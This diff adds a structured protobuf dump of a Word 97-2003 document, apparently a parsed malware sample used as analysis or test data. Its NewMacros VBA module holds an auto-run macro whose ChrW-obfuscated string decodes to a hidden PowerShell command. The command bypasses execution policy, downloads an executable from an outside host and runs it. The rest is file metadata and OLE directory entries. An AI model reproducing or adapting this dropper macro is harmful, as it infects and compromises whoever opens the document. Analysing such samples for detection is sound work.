@@ -1,0 +1,453 @@
+summary_information {
+  byte_order: 65534
+  version: 0
+  system_id: 131334
+  clsid {
+    data: "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
+  }
+  property_set {
+    fmtid {
+      data: "\340\205\237\362\371Oh\020\253\221\010\000+\'\263\331"
+    }
+    property {
+      property_id: 1
+      type: kVtI2
+      value {
+        int: 1252
+      }
+    }
+    property {
+      property_id: 4
+      type: kVtLpstr
+      value {
+        str: "lenovio"
+      }
+    }
+    property {
+      property_id: 7
+      type: kVtLpstr
+      value {
+        str: "Normal"
+      }
+    }
+    property {
+      property_id: 8
+      type: kVtLpstr
+      value {
+        str: "lenovio"
+      }
+    }
+    property {
+      property_id: 9
+      type: kVtLpstr
+      value {
+        str: "1"
+      }
+    }
+    property {
+      property_id: 18
+      type: kVtLpstr
+      value {
+        str: "Microsoft Office Word"
+      }
+    }
+    property {
+      property_id: 10
+      type: kVtFiletime
+      value {
+        uint: 1200000000
+      }
+    }
+    property {
+      property_id: 12
+      type: kVtFiletime
+      value {
+        uint: 132372792600000000
+      }
+    }
+    property {
+      property_id: 13
+      type: kVtFiletime
+      value {
+        uint: 132372793800000000
+      }
+    }
+    property {
+      property_id: 14
+      type: kVtI4
+      value {
+        int: 1
+      }
+    }
+    property {
+      property_id: 15
+      type: kVtI4
+      value {
+        int: 0
+      }
+    }
+    property {
+      property_id: 16
+      type: kVtI4
+      value {
+        int: 0
+      }
+    }
+    property {
+      property_id: 19
+      type: kVtI4
+      value {
+        int: 0
+      }
+    }
+  }
+}
+document_summary_information {
+  byte_order: 65534
+  version: 0
+  system_id: 131334
+  clsid {
+    data: "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
+  }
+  property_set {
+    fmtid {
+      data: "\002\325\315\325\234.\033\020\223\227\010\000+,\371\256"
+    }
+    property {
+      property_id: 1
+      type: kVtI2
+      value {
+        int: 1252
+      }
+    }
+    property {
+      property_id: 15
+      type: kVtLpstr
+      value {
+        str: ""
+      }
+    }
+    property {
+      property_id: 5
+      type: kVtI4
+      value {
+        int: 1
+      }
+    }
+    property {
+      property_id: 6
+      type: kVtI4
+      value {
+        int: 1
+      }
+    }
+    property {
+      property_id: 17
+      type: kVtI4
+      value {
+        int: 0
+      }
+    }
+    property {
+      property_id: 23
+      type: kVtI4
+      value {
+        int: 786432
+      }
+    }
+    property {
+      property_id: 11
+      type: kVtBool
+      value {
+        boolean: false
+      }
+    }
+    property {
+      property_id: 16
+      type: kVtBool
+      value {
+        boolean: false
+      }
+    }
+    property {
+      property_id: 19
+      type: kVtBool
+      value {
+        boolean: false
+      }
+    }
+    property {
+      property_id: 22
+      type: kVtBool
+      value {
+        boolean: false
+      }
+    }
+    property {
+      property_id: 13
+      type: kVtVectorVtLpstr
+      value {
+        vector {
+          type: kVtLpstr
+          value {
+            str: ""
+          }
+        }
+      }
+    }
+    property {
+      property_id: 12
+      type: kVtVectorVtVariant
+      value {
+        vector {
+          type: kVtVariant
+          value {
+            str: "Title"
+          }
+          value {
+            int: 1
+          }
+        }
+      }
+    }
+  }
+}
+vba_code {
+  chunk {
+    code: "Attribute VB_Name = \"ThisDocument\"\r\nAttribute VB_Base = \"1Normal.ThisDocument\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = True\r\nAttribute VB_TemplateDerived = True\r\nAttribute VB_Customizable = True\r\n"
+    filename: "ThisDocument.cls"
+    path: "/Macros/VBA/ThisDocument"
+    sha256_hex_string: "76f615001478cc8d4cce6fe76f75b2ca62880736645e205dfce15fc20f92e650"
+  }
+  chunk {
+    code: "Attribute VB_Name = \"NewMacros\"\r\nSub AutoOpen()\r\nexec1 = ChrW(113 - 1) & ChrW(112 - 1) & ChrW(120 - 1) & ChrW(102 - 1) & ChrW(115 - 1) & ChrW(116 - 1) & ChrW(105 - 1) & ChrW(102 - 1) & ChrW(109 - 1) & ChrW(109 - 1) & ChrW(47 - 1)\r\nexec2 = ChrW(102 - 1) & ChrW(121 - 1) & ChrW(102 - 1) & ChrW(33 - 1) & ChrW(46 - 1) & ChrW(70 - 1) & ChrW(121 - 1) & ChrW(102 - 1) & ChrW(100 - 1) & ChrW(118 - 1) & ChrW(117 - 1)\r\nexec3 = ChrW(106 - 1) & ChrW(112 - 1) & ChrW(111 - 1) & ChrW(81 - 1) & ChrW(112 - 1) & ChrW(109 - 1) & ChrW(106 - 1) & ChrW(100 - 1) & ChrW(122 - 1) & ChrW(33 - 1) & ChrW(99 - 1)\r\nexec4 = ChrW(122 - 1) & ChrW(113 - 1) & ChrW(98 - 1) & ChrW(116 - 1) & ChrW(116 - 1) & ChrW(33 - 1) & ChrW(46 - 1) & ChrW(111 - 1) & ChrW(112 - 1) & ChrW(113 - 1) & ChrW(115 - 1)\r\nexec5 = ChrW(112 - 1) & ChrW(103 - 1) & ChrW(106 - 1) & ChrW(109 - 1) & ChrW(102 - 1) & ChrW(33 - 1) & ChrW(46 - 1) & ChrW(120 - 1) & ChrW(106 - 1) & ChrW(111 - 1) & ChrW(101 - 1)\r\nexec6 = ChrW(112 - 1) & ChrW(120 - 1) & ChrW(116 - 1) & ChrW(117 - 1) & ChrW(122 - 1) & ChrW(109 - 1) & ChrW(102 - 1) & ChrW(33 - 1) & ChrW(105 - 1) & ChrW(106 - 1) & ChrW(101 - 1)\r\nexec7 = ChrW(101 - 1) & ChrW(102 - 1) & ChrW(111 - 1) & ChrW(33 - 1) & ChrW(41 - 1) & ChrW(111 - 1) & ChrW(102 - 1) & ChrW(120 - 1) & ChrW(46 - 1) & ChrW(112 - 1) & ChrW(99 - 1)\r\nexec8 = ChrW(107 - 1) & ChrW(102 - 1) & ChrW(100 - 1) & ChrW(117 - 1) & ChrW(33 - 1) & ChrW(84 - 1) & ChrW(122 - 1) & ChrW(116 - 1) & ChrW(117 - 1) & ChrW(102 - 1) & ChrW(110 - 1)\r\nexec9 = ChrW(47 - 1) & ChrW(79 - 1) & ChrW(102 - 1) & ChrW(117 - 1) & ChrW(47 - 1) & ChrW(88 - 1) & ChrW(102 - 1) & ChrW(99 - 1) & ChrW(68 - 1) & ChrW(109 - 1) & ChrW(106 - 1)\r\nexec10 = ChrW(102 - 1) & ChrW(111 - 1) & ChrW(117 - 1) & ChrW(42 - 1) & ChrW(47 - 1) & ChrW(69 - 1) & ChrW(112 - 1) & ChrW(120 - 1) & ChrW(111 - 1) & ChrW(109 - 1) & ChrW(112 - 1)\r\nexec11 = ChrW(98 - 1) & ChrW(101 - 1) & ChrW(103 - 1) & ChrW(106 - 1) & ChrW(109 - 1) & ChrW(102 - 1) & ChrW(41 - 1) & ChrW(40 - 1) & ChrW(105 - 1) & ChrW(117 - 1) & ChrW(117 - 1)\r\nexec12 = ChrW(113 - 1) & ChrW(59 - 1) & ChrW(48 - 1) & ChrW(48 - 1) & ChrW(99 - 1) & ChrW(118 - 1) & ChrW(117 - 1) & ChrW(117 - 1) & ChrW(102 - 1) & ChrW(115 - 1) & ChrW(98 - 1)\r\nexec13 = ChrW(101 - 1) & ChrW(119 - 1) & ChrW(102 - 1) & ChrW(115 - 1) & ChrW(117 - 1) & ChrW(106 - 1) & ChrW(116 - 1) & ChrW(106 - 1) & ChrW(111 - 1) & ChrW(104 - 1) & ChrW(47 - 1)\r\nexec14 = ChrW(100 - 1) & ChrW(112 - 1) & ChrW(110 - 1) & ChrW(48 - 1) & ChrW(108 - 1) & ChrW(108 - 1) & ChrW(47 - 1) & ChrW(102 - 1) & ChrW(121 - 1) & ChrW(102 - 1) & ChrW(40 - 1)\r\nexec15 = ChrW(45 - 1) & ChrW(40 - 1) & ChrW(108 - 1) & ChrW(98 - 1) & ChrW(122 - 1) & ChrW(47 - 1) & ChrW(102 - 1) & ChrW(121 - 1) & ChrW(102 - 1) & ChrW(40 - 1) & ChrW(42 - 1)\r\nexec16 = ChrW(60 - 1) & ChrW(33 - 1) & ChrW(74 - 1) & ChrW(111 - 1) & ChrW(119 - 1) & ChrW(112 - 1) & ChrW(108 - 1) & ChrW(102 - 1) & ChrW(46 - 1) & ChrW(74 - 1) & ChrW(117 - 1)\r\nexec17 = ChrW(102 - 1) & ChrW(110 - 1) & ChrW(33 - 1) & ChrW(108 - 1) & ChrW(98 - 1) & ChrW(122 - 1) & ChrW(47 - 1) & ChrW(102 - 1) & ChrW(121 - 1) & ChrW(102 - 1)\r\nLast = exec0 + exec1 + exec2 + exec3 + exec4 + exec5 + exec6 + exec7 + exec8 + exec9 + exec10 + exec11 + exec12 + exec13 + exec14 + exec15 + exec16 + exec17\r\nShell (Last)\r\nEnd Sub\r\nSub Auto_Open()\r\nAutoOpen\r\nEnd Sub\r\nSub Workbook_Open()\r\nAutoOpen\r\nEnd Sub\r\n"
+    filename: "NewMacros.bas"
+    path: "/Macros/VBA/NewMacros"
+    sha1: "\2578\323\227\375\243P\314\347\374z\262V\017C\212*\003fe"
+    sha256_hex_string: "70c09d03a736759269230bc110e4eae7dc2d24195b187b1d4dfb750af060d429"
+  }
+}
+comp_obj {
+  version: 2563
+  user_type: "Microsoft Office Word 97-2003 Document"
+  clipboard_format: "MSWordDoc"
+  app_version: "Word.Document.8"
+}
+ole_dirs {
+  name: "Root Entry"
+  entry_type: 5
+  clsid {
+    data: "\006\t\002\000\000\000\000\000\300\000\000\000\000\000\000F"
+  }
+  user_flags: 0
+  creation_timestamp: 0
+  modification_timestamp: 132372793923810000
+  child_index: 1
+  child_index: 2
+  child_index: 3
+  child_index: 11
+  child_index: 12
+  child_index: 13
+}
+ole_dirs {
+  name: "1Table"
+  entry_type: 2
+  clsid {
+    data: "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
+  }
+  user_flags: 0
+  creation_timestamp: 0
+  modification_timestamp: 0
+  stream_size: 6750
+  stream_hash: "w!\035\265\021\217W\206\257;\332\350\"W\262\367\273\256M\207"
+  strings: "Calibri"
+  strings: "Cambria Math"
+  strings: "Default Paragraph Font"
+  strings: "IqbJ#x"
+  strings: "No List"
+  strings: "Normal"
+  strings: "PROJECT.NEWMACROS.AUTOOPEN"
+  strings: "PROJECT.NEWMACROS.AUTO_OPEN"
+  strings: "PROJECT.NEWMACROS.WORKBOOK_OPEN"
+  strings: "Project.NewMacros.AutoOpen"
+  strings: "Project.NewMacros.Auto_Open"
+  strings: "Project.NewMacros.Workbook_Open"
+  strings: "Symbol"
+  strings: "T[XF64"
+  strings: "Table Normal"
+  strings: "Times New Roman"
+  strings: "Unknown"
+  strings: "[Content_Types].xml"
+  strings: "[Content_Types].xmlPK"
+  strings: "_rels/.relsPK"
+  strings: "lenovio"
+  strings: "theme/theme/_rels/themeManager.xml.rels"
+  strings: "theme/theme/_rels/themeManager.xml.relsPK"
+  strings: "theme/theme/theme1.xml"
+  strings: "theme/theme/theme1.xmlPK"
+  strings: "theme/theme/themeManager.xml"
+  strings: "theme/theme/themeManager.xmlPK"
+}
+ole_dirs {
+  name: " CompObj"
+  entry_type: 2
+  clsid {
+    data: "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
+  }
+  user_flags: 0
+  creation_timestamp: 0
+  modification_timestamp: 0
+  stream_size: 121
+  stream_hash: "\233\037\016=Z\241\263U\232\376\025N\213E\235\013\214\2439\363"
+}
+ole_dirs {
+  name: "Macros"
+  entry_type: 1
+  clsid {
+    data: "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
+  }
+  user_flags: 0
+  creation_timestamp: 132372793920610000
+  modification_timestamp: 132372793923010000
+  child_index: 4
+  child_index: 9
+  child_index: 10
+}
+ole_dirs {
+  name: "VBA"
+  entry_type: 1
+  clsid {
+    data: "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
+  }
+  user_flags: 0
+  creation_timestamp: 132372793920610000
+  modification_timestamp: 132372793922010000
+  child_index: 5
+  child_index: 6
+  child_index: 7
+  child_index: 8
+}
+ole_dirs {
+  name: "dir"
+  entry_type: 2
+  clsid {
+    data: "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
+  }
+  user_flags: 0
+  creation_timestamp: 0
+  modification_timestamp: 0
+  stream_size: 575
+  stream_hash: "\006\360\277VF\020\213\204\221\001\274FV\246QFE`\206\014"
+}
+ole_dirs {
+  name: "NewMacros"
+  entry_type: 2
+  clsid {
+    data: "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
+  }
+  user_flags: 0
+  creation_timestamp: 0
+  modification_timestamp: 0
+  stream_size: 5548
+  stream_hash: "\301\013\330\345\020\365*\270\204\361\267\255\001\'\230\343l\2269y"
+}
+ole_dirs {
+  name: "_VBA_PROJECT"
+  entry_type: 2
+  clsid {
+    data: "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
+  }
+  user_flags: 0
+  creation_timestamp: 0
+  modification_timestamp: 0
+  stream_size: 2888
+  stream_hash: "\335\235\001h1\206xa\227\260\225\226yb\262W\245>\037\220"
+}
+ole_dirs {
+  name: "ThisDocument"
+  entry_type: 2
+  clsid {
+    data: "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
+  }
+  user_flags: 0
+  creation_timestamp: 0
+  modification_timestamp: 0
+  stream_size: 924
+  stream_hash: "W\313L\224={\234?\371?\313\304\376\024\237\357\342\251\263\005"
+}
+ole_dirs {
+  name: "PROJECTwm"
+  entry_type: 2
+  clsid {
+    data: "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
+  }
+  user_flags: 0
+  creation_timestamp: 0
+  modification_timestamp: 0
+  stream_size: 71
+  stream_hash: "g9\025\262\230\016\026y\357\221\341\244\010\271\226<\325\020\221\260"
+  strings: "NewMacros"
+  strings: "ThisDocument"
+  strings: "sNewMacros"
+  strings: "tThisDocument"
+}
+ole_dirs {
+  name: "PROJECT"
+  entry_type: 2
+  clsid {
+    data: "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
+  }
+  user_flags: 0
+  creation_timestamp: 0
+  modification_timestamp: 0
+  stream_size: 418
+  stream_hash: "\231^\332\243\034\372\212\236\201\026@jl\332\236\317\335\226\016\225"
+  strings: "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000"
+  strings: "CMG=\"D4D6D871F800FC00FC00FC00FC\""
+  strings: "DPB=\"67656BE26DE601E701E701\""
+  strings: "Document=ThisDocument/&H00000000"
+  strings: "GC=\"FAF8F6978898889877\""
+  strings: "HelpContextID=\"0\""
+  strings: "ID=\"{1A8B5F99-878D-4972-9EF6-F0C5CF3DD271}\""
+  strings: "Module=NewMacros"
+  strings: "Name=\"Project\""
+  strings: "VersionCompatible32=\"393222000\""
+  strings: "[Host Extender Info]"
+  strings: "[Workspace]"
+}
+ole_dirs {
+  name: "WordDocument"
+  entry_type: 2
+  clsid {
+    data: "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
+  }
+  user_flags: 0
+  creation_timestamp: 0
+  modification_timestamp: 0
+  stream_size: 4096
+  stream_hash: "E)K\263\345\353\215\267jvQ\366g\227\365\036\347qSQ"
+}
+ole_dirs {
+  name: " DocumentSummaryInformation"
+  entry_type: 2
+  clsid {
+    data: "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
+  }
+  user_flags: 0
+  creation_timestamp: 0
+  modification_timestamp: 0
+  stream_size: 4096
+  stream_hash: "\005mD\351\374v\337\224e\324\301]\321\355\265\022\204\255\030\304"
+}
+ole_dirs {
+  name: " SummaryInformation"
+  entry_type: 2
+  clsid {
+    data: "\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
+  }
+  user_flags: 0
+  creation_timestamp: 0
+  modification_timestamp: 0
+  stream_size: 4096
+  stream_hash: "\270\256R\310\277\257\037\204\337\313\031\203\201\274\207\3133!0\010"
+}
